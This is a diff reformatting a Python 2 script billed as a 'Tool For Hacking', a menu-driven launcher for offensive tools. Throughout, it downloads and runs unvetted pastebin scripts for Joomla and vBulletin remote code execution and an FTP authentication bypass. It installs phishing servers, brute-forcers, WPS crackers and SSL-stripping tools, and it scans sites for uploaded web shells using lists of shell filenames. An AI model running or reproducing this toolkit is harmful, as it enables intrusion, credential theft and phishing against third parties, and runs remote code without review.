@@ -1,18 +1,18 @@
- #!/usr/bin/env python2.7
-#    ______              _      _           _______                   
-#   |  ____|            (_)    | |         |__   __|                  
-#   | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___  
-#   |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \ 
+#!/usr/bin/env python2.7
+#    ______              _      _           _______
+#   |  ____|            (_)    | |         |__   __|
+#   | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___
+#   |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \
 #   | |  \__ \ (_) | (__| |  __/ |_| |_| |    | |  __/ (_| | | | | | |
 #   |_|  |___/\___/ \___|_|\___|\__|\__, |    |_|\___|\__,_|_| |_| |_|
-#                                    __/ |                            
-#                                   |___/           
+#                                    __/ |
+#                                   |___/
 
 #                                 Greet's To
 
 #                               IcoDz - Canejo
-                  
-#                             Tool For Hacking 
+
+#                             Tool For Hacking
 #                       Authors : Manisso & IcoDz
 
 import sys
@@ -21,13 +21,16 @@ import os
 import time
 import httplib
 import subprocess
-import re, urllib2
+import re
+import urllib2
 import socket
-import urllib,sys,json
+import urllib
+import sys
+import json
 import telnetlib
 import glob
 import random
-import Queue 
+import Queue
 import threading
 import requests
 import base64
@@ -39,73 +42,82 @@ from urlparse import urlparse
 from xml.dom import minidom
 from optparse import OptionParser
 from time import sleep
-########################## 
+##########################
 os.system('clear')
+
+
 def menu():
     print ("""
- #     #                                      
- ##   ##   ##   #    # #  ####   ####   ####  
- # # # #  #  #  ##   # # #      #      #    # 
- #  #  # #    # # #  # #  ####   ####  #    # 
- #     # ###### #  # # #      #      # #    # 
- #     # #    # #   ## # #    # #    # #    # 
- #     # #    # #    # #  ####   ####   ####  
-                                              
-     #######                             
-       #     ####   ####  #       ####  
-       #    #    # #    # #      #      
-       #    #    # #    # #       ####  
-       #    #    # #    # #           # 
-       #    #    # #    # #      #    # 
-       #     ####   ####  ######  #### 
-             Penetration Testing Tools 
-                                       
+ #     #
+ ##   ##   ##   #    # #  ####   ####   ####
+ # # # #  #  #  ##   # # #      #      #    #
+ #  #  # #    # # #  # #  ####   ####  #    #
+ #     # ###### #  # # #      #      # #    #
+ #     # #    # #   ## # #    # #    # #    #
+ #     # #    # #    # #  ####   ####   ####
+
+     #######
+       #     ####   ####  #       ####
+       #    #    # #    # #      #
+       #    #    # #    # #       ####
+       #    #    # #    # #           #
+       #    #    # #    # #      #    #
+       #     ####   ####  ######  ####
+             Penetration Testing Tools
+
                                                """)
+
+
 os.system('clear')
 os.system('clear')
 os.system('clear')
 os.system('clear')
 
-directories = ['/uploads/','/upload/','/files/','/resume/','/resumes/','/documents/','/docs/','/pictures/','/file/','/Upload/','/Uploads/','/Resume/','/Resume/','/UsersFiles/','/Usersiles/','/usersFiles/','/Users_Files/','/UploadedFiles/','/Uploaded_Files/','/uploadedfiles/','/uploadedFiles/','/hpage/','/admin/upload/','/admin/uploads/','/admin/resume/','/admin/resumes/','/admin/pictures/','/pics/','/photos/','/Alumni_Photos/','/alumni_photos/','/AlumniPhotos/','/users/']
-shells = ['wso.php','shell.php','an.php','hacker.php','lol.php','up.php','cp.php','upload.php','sh.php','pk.php','mad.php','x00x.php','worm.php','1337worm.php','config.php','x.php','haha.php']
+directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
+               '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
+shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
+          'sh.php', 'pk.php', 'mad.php', 'x00x.php', 'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php']
 upload = []
-yes = set(['yes','y', 'ye', 'Y'])
-no = set(['no','n'])
+yes = set(['yes', 'y', 'ye', 'Y'])
+no = set(['no', 'n'])
+
 
 def logo():
     print """
-  __  __             _               
- |  \/  |           (_)              
- | \  / | __ _ _ __  _ ___ ___  ___  
- | |\/| |/ _` | '_ \| / __/ __|/ _ \ 
+  __  __             _
+ |  \/  |           (_)
+ | \  / | __ _ _ __  _ ___ ___  ___
+ | |\/| |/ _` | '_ \| / __/ __|/ _ \
  | |  | | (_| | | | | \__ \__ \ (_) |
- |_|  |_|\__,_|_| |_|_|___/___/\___/ 
+ |_|  |_|\__,_|_| |_|_|___/___/\___/
  _____           _ ~ Multi Tools By Manisso ~
-|_   _|         | |    
-  | | ___   ___ | |___ 
+|_   _|         | |
+  | | ___   ___ | |___
   | |/ _ \ / _ \| / __|
   | | (_) | (_) | \__ \
   \_/\___/ \___/|_|___/
-                       
-                                                           
-                                      
+
+
+
 
 """
+
+
 def menu():
     print ("""
-  ______              _      _           _______                   
- |  ____|            (_)    | |         |__   __|                 
- | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___  
- |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \ 
+  ______              _      _           _______
+ |  ____|            (_)    | |         |__   __|
+ | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___
+ |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \
  | |  \__ \ (_) | (__| |  __/ |_| |_| |    | |  __/ (_| | | | | | |
  |_|  |___/\___/ \___|_|\___|\__|\__, |    |_|\___|\__,_|_| |_| |_|
-  * Copyright El Moujahidin Team  __/ |                        V 2.0     
-                                 |___/                                           
+  * Copyright El Moujahidin Team  __/ |                        V 2.0
+                                 |___/
 
-         [+]            Coded By Manisso               [+] 
-         [+]         https://fb.me/dzmanisso           [+] 
-         [+]       Greetz To IcoDz & Canejo Dz         [+] 
-        
+         [+]            Coded By Manisso               [+]
+         [+]         https://fb.me/dzmanisso           [+]
+         [+]       Greetz To IcoDz & Canejo Dz         [+]
+
     Select From The Menu:
 
     1 : Information Gathering
@@ -113,7 +125,7 @@ def menu():
     3 : Wireless Testing
     4 : Exploitation Tools
     5 : Sniffing & Spoofing
-    6 : Web Hacking 
+    6 : Web Hacking
     7 : Private Web Hacking
     8 : Post Exploitation
     0 : INSTALL & UPDATE
@@ -139,32 +151,36 @@ def menu():
     elif choice == "8":
         postexp()
     elif choice == "9":
-        sniper() 
+        sniper()
     elif choice == "0":
-        updatefs()       
+        updatefs()
     elif choice == "99":
-        clearScr(),sys.exit();
+        clearScr(), sys.exit()
     elif choice == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def sniper():
     print ("This tool is only available for Linux and similar systems ")
     choicesniper = raw_input("Continue Y / N: ")
     if choicesniper in yes:
-        os.system ("git clone https://github.com/Manisso/fsociety.git")
-        os.system ("cd fsociety && sudo bash ./install.sh")
-        os.system ("fsociety")
+        os.system("git clone https://github.com/Manisso/fsociety.git")
+        os.system("cd fsociety && sudo bash ./install.sh")
+        os.system("fsociety")
     elif choicesniper == "":
         menu()
+
 
 def updatefs():
     print ("This tool is only available for Linux and similar systems ")
     choicesniper = raw_input("Continue Y / N: ")
     if choicesniper in yes:
-        os.system ("git clone https://github.com/Manisso/fsociety.git")
-        os.system ("cd fsociety && sudo bash ./update.sh")
-        os.system ("fsociety")
+        os.system("git clone https://github.com/Manisso/fsociety.git")
+        os.system("cd fsociety && sudo bash ./update.sh")
+        os.system("fsociety")
+
 
 def doork():
     print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
@@ -174,7 +190,9 @@ def doork():
         os.system("git clone https://github.com/AeonDave/doork")
         clearScr()
         doorkt = raw_input("Target : ")
-        os.system("cd doork && python doork.py -t %s -o log.log"%doorkt)
+        os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)
+
+
 def postexp():
     clearScr()
     print("1:  Shell Checker")
@@ -191,6 +209,8 @@ def postexp():
         weeman()
     elif choice11 == "99":
         menu()
+
+
 def scanusers():
     site = raw_input('Enter a website : ')
     try:
@@ -207,22 +227,27 @@ def scanusers():
             users = users.replace('/', '')
         while len(users) > 2:
             print users
-            resp = urllib2.urlopen(site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
-            
+            resp = urllib2.urlopen(
+                site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()
+
             if 'invalid username' not in resp.lower():
-                print "\tFound -> %s" %users
+                print "\tFound -> %s" % users
                 pass
 
             users = users[:-1]
     except:
         pass
+
+
 def brutex():
     clearScr()
     print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
     os.system("git clone https://github.com/1N3/BruteX.git")
     clearScr
     brutexchoice = raw_input("Select a Target : ")
-    os.system("cd BruteX && chmod 777 brutex && ./brutex %s"%brutexchoice)
+    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)
+
+
 def arachni():
     print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
     cara = raw_input("Install And Run ? Y / N : ")
@@ -231,46 +256,63 @@ def arachni():
     tara = raw_input("Select a target to scan : ")
     if cara in yes:
         os.system("git clone git://github.com/Arachni/arachni.git")
-        os.system("cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
+        os.system(
+            "cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
         os.system("archani")
     clearScr()
-    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s"%tara)
+    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)
+
+
 def xsstracer():
     clearScr()
     print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
     os.system("git clone https://github.com/1N3/XSSTracer.git")
-    clearScr ()
+    clearScr()
     xsstracerchoice = raw_input("Select a Target: ")
-    os.system("cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80"%xsstracerchoice)
+    os.system(
+        "cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80" % xsstracerchoice)
+
+
 def weeman():
     print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
     choicewee = raw_input("Install Weeman ? Y / N : ")
     if choicewee in yes:
-        os.system("git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
+        os.system(
+            "git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
     if choicewee in no:
         menu()
     else:
-        menu()    
+        menu()
+
+
 def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
     os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
-    ftpbypass=raw_input("Enter Target IP and Use Command :")
-    os.system("python gabriel.py %s"%ftpbypass)
+    ftpbypass = raw_input("Enter Target IP and Use Command :")
+    os.system("python gabriel.py %s" % ftpbypass)
+
+
 def sitechecker():
     os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
     clearScr()
     os.system("python ch01.py")
+
+
 def h2ip():
     host = raw_input("Select A Host : ")
     ips = socket.gethostbyname(host)
     print(ips)
+
+
 def ports():
     clearScr()
     target = raw_input('Select a Target IP -> ')
-    os.system("nmap -O -Pn %s" % target) 
-    sys.exit();
+    os.system("nmap -O -Pn %s" % target)
+    sys.exit()
+
+
 def ifinurl():
     print""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found."""
     print('Do You Want To Install InurlBR ? ')
@@ -281,15 +323,19 @@ def ifinurl():
         menu()
     elif cinurl == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def bsqlbf():
     clearScr()
     print("This tool will only work on blind sql injection")
-    cbsq=raw_input("select target : ")
+    cbsq = raw_input("select target : ")
     os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
-    os.system("perl bsqlbf.pl -url %s"%cbsq)
+    os.system("perl bsqlbf.pl -url %s" % cbsq)
     os.system("rm bsqlbf.pl")
+
+
 def venom():
     print ("Venom Automatic Shellcode Generator")
     print ("Do You To Install Venom ?")
@@ -299,7 +345,10 @@ def venom():
         os.system("unzip venom.zip -d venom")
         os.system("cd venom && sh venom.sh")
     elif choiceshell in no:
-        os.system('clear'); info()     
+        os.system('clear')
+        info()
+
+
 def commix():
     print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
     print ("usage : python commix.py --help")
@@ -310,21 +359,26 @@ def commix():
         os.system("python commix.py")
         os.system("")
     elif choicecmx in no:
-        os.system('clear'); info()        
+        os.system('clear')
+        info()
+
+
 def pixiewps():
     print"""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
     """
     choicewps = raw_input("Continue ? Y/N : ")
-    if choicewps in yes :
-        os.system("git clone https://github.com/wiire/pixiewps.git") 
+    if choicewps in yes:
+        os.system("git clone https://github.com/wiire/pixiewps.git")
         os.system(" cd pixiewps/src & make ")
         os.system(" cd pixiewps/src & sudo make install")
-    if choicewps in no : 
-        menu() 
+    if choicewps in no:
+        menu()
     elif choicewps == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def webhack():
     print("1 : Drupal Hacking ")
     print("2 : Inurlbr")
@@ -344,51 +398,72 @@ def webhack():
         clearScr()
         maine()
     if choiceweb == "2":
-        clearScr(); ifinurl()
-    if choiceweb =='3':
-        clearScr(); wppjmla()
-    if choiceweb =="4":
-        clearScr(); gravity()
-    if choiceweb =="5":
-        clearScr(); sqlscan()
-    if choiceweb =="6":
-        clearScr(); wpminiscanner()
-    if choiceweb =="7":
-        clearScr();wppluginscan()
-    if choiceweb =="8":
-        clearScr();shelltarget()
-    if choiceweb =="9":
-        clearScr();joomlarce()
-    if choiceweb =="10":
-        clearScr();vbulletinrce()
-    if choiceweb =="11":
-        clearScr();brutex()
-    if choiceweb=="12":
-        clearScr();arachni()
-    elif choiceweb =="99":
+        clearScr()
+        ifinurl()
+    if choiceweb == '3':
+        clearScr()
+        wppjmla()
+    if choiceweb == "4":
+        clearScr()
+        gravity()
+    if choiceweb == "5":
+        clearScr()
+        sqlscan()
+    if choiceweb == "6":
+        clearScr()
+        wpminiscanner()
+    if choiceweb == "7":
+        clearScr()
+        wppluginscan()
+    if choiceweb == "8":
+        clearScr()
+        shelltarget()
+    if choiceweb == "9":
+        clearScr()
+        joomlarce()
+    if choiceweb == "10":
+        clearScr()
+        vbulletinrce()
+    if choiceweb == "11":
+        clearScr()
+        brutex()
+    if choiceweb == "12":
+        clearScr()
+        arachni()
+    elif choiceweb == "99":
         menu()
     elif choiceweb == "":
         menu()
-    else: 
-        menu() 
+    else:
+        menu()
+
+
 def vbulletinrce():
     os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
     os.system("perl tmp.pl")
+
+
 def joomlarce():
     os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
-    clearScr();print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
-    jmtarget=raw_input("Select a targets list :")
-    os.system("python temp.py %s"%jmtarget)
+    clearScr()
+    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
+    jmtarget = raw_input("Select a targets list :")
+    os.system("python temp.py %s" % jmtarget)
+
+
 def inurl():
     dork = raw_input("select a Dork:")
     output = raw_input("select a file to save :")
-    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
+    os.system(
+        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
     if cinurl in no:
         insinurl()
     elif cinurl == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def insinurl():
     os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
     os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
@@ -396,22 +471,26 @@ def insinurl():
     os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
     clearScr()
     inurl()
+
+
 def nmap():
 
     choice7 = raw_input("continue ? Y / N : ")
-    if choice7 in yes :
+    if choice7 in yes:
         os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
         os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
         os.system("cd nmap-7.01 & ./configure")
         os.system("cd nmap-7.01 & make")
         os.system("su root")
         os.system("cd nmap-7.01 & make install")
-    elif choice7 in no :
+    elif choice7 in no:
         info()
     elif choice7 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def jboss():
     os.system('clear')
     print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
@@ -422,29 +501,36 @@ def jboss():
     print("Continue: y/n")
     choice9 = raw_input("yes / no :")
     if choice9 in yes:
-        os.system("git clone https://github.com/SpiderLabs/jboss-autopwn.git"),sys.exit();
+        os.system(
+            "git clone https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
     elif choice9 in no:
-        os.system('clear'); exp()
+        os.system('clear')
+        exp()
     elif choice9 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def wppluginscan():
-    Notfound = [404,401,400,403,406,301]
+    Notfound = [404, 401, 400, 403, 406, 301]
     sitesfile = raw_input("sites file : ")
     filepath = raw_input("Plugins File : ")
+
     def scan(site, dir):
         global resp
         try:
-                conn = httplib.HTTPConnection(site)
-                conn.request('HEAD', "/wp-content/plugins/" + dir)
-                resp = conn.getresponse().status
+            conn = httplib.HTTPConnection(site)
+            conn.request('HEAD', "/wp-content/plugins/" + dir)
+            resp = conn.getresponse().status
         except(), message:
-                print "Cant Connect :",message
-                pass
+            print "Cant Connect :", message
+            pass
+
     def timer():
         now = time.localtime(time.time())
         return time.asctime(now)
+
     def main():
         sites = open(sitesfile).readlines()
         plugins = open(filepath).readlines()
@@ -452,51 +538,63 @@ def wppluginscan():
             site = site.rstrip()
         for plugin in plugins:
             plugin = plugin.rstrip()
-            scan(site,plugin)
+            scan(site, plugin)
             if resp not in Notfound:
-                    print "+----------------------------------------+"
-                    print "| current site :" + site
-                    print "| Found Plugin : "  + plugin
-                    print "| Result:",resp
+                print "+----------------------------------------+"
+                print "| current site :" + site
+                print "| Found Plugin : " + plugin
+                print "| Result:", resp
+
+
 def sqlmap():
     print ("usage : python sqlmap.py -h")
     choice8 = raw_input("Continue: y/n :")
     if choice8 in yes:
-        os.system("git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
+        os.system(
+            "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
     elif choice8 in no:
-        os.system('clear'); info()
+        os.system('clear')
+        info()
     elif choice8 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def grabuploadedlink(url):
-    try :
-                    for dir in directories :
-                              currentcode = urllib.urlopen(url + dir).getcode()
-                              if currentcode == 200 or currentcode ==  403:
-                                     print "-------------------------"
-                                     print "  [ + ] Found Directory :  " + str(url + dir)               + " [ + ]"     
-                                     print "-------------------------"                                                                   
-                                     upload.append(url + dir)  
-    except :
-      pass     
-def grabshell(url) :                                                                     
-   try :
-        for upl in upload :
-                            for shell in shells :
-                              currentcode = urllib.urlopen(upl + shell).getcode()
-                              if currentcode == 200 :
-                                     print "-------------------------"
-                                     print "  [ ! ] Found Shell :  " + str(upl + shell)         + " [ ! ]"     
-                                     print "-------------------------"         
-   except :
-        pass  
+    try:
+        for dir in directories:
+            currentcode = urllib.urlopen(url + dir).getcode()
+            if currentcode == 200 or currentcode == 403:
+                print "-------------------------"
+                print "  [ + ] Found Directory :  " + str(url + dir) + " [ + ]"
+                print "-------------------------"
+                upload.append(url + dir)
+    except:
+        pass
+
+
+def grabshell(url):
+    try:
+        for upl in upload:
+            for shell in shells:
+                currentcode = urllib.urlopen(upl + shell).getcode()
+                if currentcode == 200:
+                    print "-------------------------"
+                    print "  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]"
+                    print "-------------------------"
+    except:
+        pass
+
+
 def shelltarget():
     print("exemple : http://target.com")
     line = raw_input("target : ")
     line = line.rstrip()
     grabuploadedlink(line)
     grabshell(line)
+
+
 def poet():
     print("POET is a simple POst-Exploitation Tool.")
     print("")
@@ -505,11 +603,14 @@ def poet():
         os.system("git clone https://github.com/mossberg/poet.git")
         os.system("python poet/server.py")
     if choicepoet in no:
-        clearScr(); postexp()
+        clearScr()
+        postexp()
     elif choicepoet == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def setoolkit():
     print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
     print(") designed for social engineering. SET has a number of custom attack vectors that ")
@@ -518,28 +619,35 @@ def setoolkit():
     print("")
     choiceset = raw_input("y / n :")
     if choiceset in yes:
-        os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
+        os.system(
+            "git clone https://github.com/trustedsec/social-engineer-toolkit.git")
         os.system("python social-engineer-toolkit/setup.py")
     if choiceset in no:
-        clearScr(); info()
+        clearScr()
+        info()
     elif choiceset == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def cupp():
     print("cupp is a password list generator ")
     print("Usage: python cupp.py -h")
     choicecupp = raw_input("Continue: y/n : ")
-    
+
     if choicecupp in yes:
         os.system("git clone https://github.com/Mebus/cupp.git")
         print("file downloaded successfully")
     elif choicecupp in no:
-        clearScr(); passwd()
+        clearScr()
+        passwd()
     elif choicecupp == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def ncrack():
     print("A Ruby interface to Ncrack, Network authentication cracking tool.")
     print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
@@ -550,11 +658,14 @@ def ncrack():
         os.system("cd ruby-ncrack")
         os.system("install ruby-ncrack")
     elif choicencrack in no:
-        clearScr(); passwd()
+        clearScr()
+        passwd()
     elif choicencrack == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def reaver():
     print """
       Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
@@ -564,80 +675,95 @@ def reaver():
         """
     creaver = raw_input("y / n :")
     if creaver in yes:
-        os.system("apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
+        os.system(
+            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
         os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
         os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
         os.system("cd reaver-wps-fork-t6x/src/ & make")
     elif creaver in no:
-        clearScr(); wire()
+        clearScr()
+        wire()
     elif creaver == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def ssls():
-    print"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
+    print"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
     attacks.
     It requires Python 2.5 or newer, along with the 'twisted' python module."""
     cssl = raw_input("y / n :")
-    if cssl in yes: 
+    if cssl in yes:
         os.system("git clone https://github.com/moxie0/sslstrip.git")
         os.system("sudo apt-get install python-twisted-web")
         os.system("python sslstrip/setup.py")
     if cssl in no:
         snif()
-    elif cssl =="":
+    elif cssl == "":
         menu()
     else:
         menu()
+
+
 def unique(seq):
-        seen = set()
-        return [seen.add(x) or x for x in seq if x not in seen]
+    seen = set()
+    return [seen.add(x) or x for x in seq if x not in seen]
+
+
 def bing_all_grabber(s):
-        
-        lista = []
-        page = 1
-        while page <= 101:
-                try:
-                        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
-                        openbing = urllib2.urlopen(bing)
-                        readbing = openbing.read()
-                        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
-                        for i in range(len(findwebs)):
-                                allnoclean = findwebs[i]
-                                findall1 = re.findall('http://(.*?)/', allnoclean)
-                                for idx, item in enumerate(findall1):
-                                        if 'www' not in item:
-                                                findall1[idx] = 'http://www.' + item + '/'
-                                        else:
-                                                findall1[idx] = 'http://' + item + '/'
-                                lista.extend(findall1)
- 
-                        page += 50
-                except urllib2.URLError:
-                        pass
- 
-        final = unique(lista)
-        return final
-def check_gravityforms(sites) :
-        import urllib
-        gravityforms = []
-        for site in sites :
-                try :
-                        if urllib.urlopen(site+'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403 :
-                                gravityforms.append(site)
-                except :
-                        pass
- 
-        return gravityforms
+
+    lista = []
+    page = 1
+    while page <= 101:
+        try:
+            bing = "http://www.bing.com/search?q=ip%3A" + \
+                s + "+&count=50&first=" + str(page)
+            openbing = urllib2.urlopen(bing)
+            readbing = openbing.read()
+            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
+            for i in range(len(findwebs)):
+                allnoclean = findwebs[i]
+                findall1 = re.findall('http://(.*?)/', allnoclean)
+                for idx, item in enumerate(findall1):
+                    if 'www' not in item:
+                        findall1[idx] = 'http://www.' + item + '/'
+                    else:
+                        findall1[idx] = 'http://' + item + '/'
+                lista.extend(findall1)
+
+            page += 50
+        except urllib2.URLError:
+            pass
+
+    final = unique(lista)
+    return final
+
+
+def check_gravityforms(sites):
+    import urllib
+    gravityforms = []
+    for site in sites:
+        try:
+            if urllib.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
+                gravityforms.append(site)
+        except:
+            pass
+
+    return gravityforms
+
+
 def gravity():
     ip = raw_input('Enter IP : ')
     sites = bing_all_grabber(str(ip))
     gravityforms = check_gravityforms(sites)
-    for ss in gravityforms :
-            print ss
-     
+    for ss in gravityforms:
+        print ss
+
     print '\n'
     print '[*] Found, ', len(gravityforms), ' gravityforms.'
+
+
 def shellnoob():
     print """Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!"""
     cshell = raw_input("Y / N : ")
@@ -647,15 +773,17 @@ def shellnoob():
         os.system("sudo python shellnoob.py --install")
     if cshell in no:
         exp()
-    elif cshell =="":
+    elif cshell == "":
         menu()
     else:
         menu()
+
+
 def info():
-    print("""  
-   __                _      _         
-  / _|              (_)    | |        
- | |_ ___  ___   ___ _  ___| |_ _   _ 
+    print("""
+   __                _      _
+  / _|              (_)    | |
+ | |_ ___  ___   ___ _  ___| |_ _   _
  |  _/ __|/ _ \ / __| |/ _ \ __| | | |
  | | \__ \ (_) | (__| |  __/ |_| |_| |
  |_| |___/\___/ \___|_|\___|\__|\__, |
@@ -673,51 +801,72 @@ def info():
     print("99: Back To Main Menu \n")
     choice2 = raw_input("-> ")
     if choice2 == "1":
-        os.system('clear'); nmap()
+        os.system('clear')
+        nmap()
     if choice2 == "2":
-        clearScr(); setoolkit()
+        clearScr()
+        setoolkit()
     if choice2 == "3":
-        clearScr(); ports()
+        clearScr()
+        ports()
     if choice2 == "4":
-        clearScr(); h2ip()
+        clearScr()
+        h2ip()
     if choice2 == "5":
-        clearScr(); wpue()
+        clearScr()
+        wpue()
     if choice2 == "6":
-        clearScr(); cmsscan()
+        clearScr()
+        cmsscan()
     if choice2 == "7":
-        clearScr(); xsstracer()
+        clearScr()
+        xsstracer()
     if choice2 == "8":
-        clearScr();doork()
-    elif choice2 =="99":
-        clearScr(); menu()
+        clearScr()
+        doork()
+    elif choice2 == "99":
+        clearScr()
+        menu()
     if choice2 == "9":
-        clearScr();scanusers()
+        clearScr()
+        scanusers()
     elif choice2 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def cmsscan():
     os.system("git clone https://github.com/Dionach/CMSmap.git")
-    clearScr();
-    xz=raw_input("select target : ") 
-    os.system("cd CMSmap @@ sudo cmsmap.py %s"%xz)
+    clearScr()
+    xz = raw_input("select target : ")
+    os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)
+
+
 def wpue():
     os.system("git clone https://github.com/wpscanteam/wpscan.git")
-    clearScr();
-    xe=raw_input("Select a Wordpress target : ")
-    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u"%xe)
+    clearScr()
+    xe = raw_input("Select a Wordpress target : ")
+    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)
+
+
 def priv8():
     tnn()
+
+
 def androidhash():
-    key=raw_input("Enter the android hash : ")
-    salt=raw_input("Enter the android salt : ")
+    key = raw_input("Enter the android hash : ")
+    salt = raw_input("Enter the android salt : ")
     os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
-    os.system("cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s"% (key, salt))
+    os.system(
+        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))
+
+
 def passwd():
-    print("""  
-   __                _      _         
-  / _|              (_)    | |        
- | |_ ___  ___   ___ _  ___| |_ _   _ 
+    print("""
+   __                _      _
+  / _|              (_)    | |
+ | |_ ___  ___   ___ _  ___| |_ _   _
  |  _/ __|/ _ \ / __| |/ _ \ __| | | |
  | | \__ \ (_) | (__| |  __/ |_| |_| |
  |_| |___/\___/ \___|_|\___|\__|\__, |
@@ -728,30 +877,37 @@ def passwd():
 
     print("99: Back To Main Menu \n")
     choice3 = raw_input("-> ")
-    if choice3 =="1":
-     clearScr(); cupp()
-    elif choice3 =="2":
-        clearScr(); ncrack()
-    elif choice3 =="99":
-        clearScr(); menu()
+    if choice3 == "1":
+        clearScr()
+        cupp()
+    elif choice3 == "2":
+        clearScr()
+        ncrack()
+    elif choice3 == "99":
+        clearScr()
+        menu()
     elif choice3 == "":
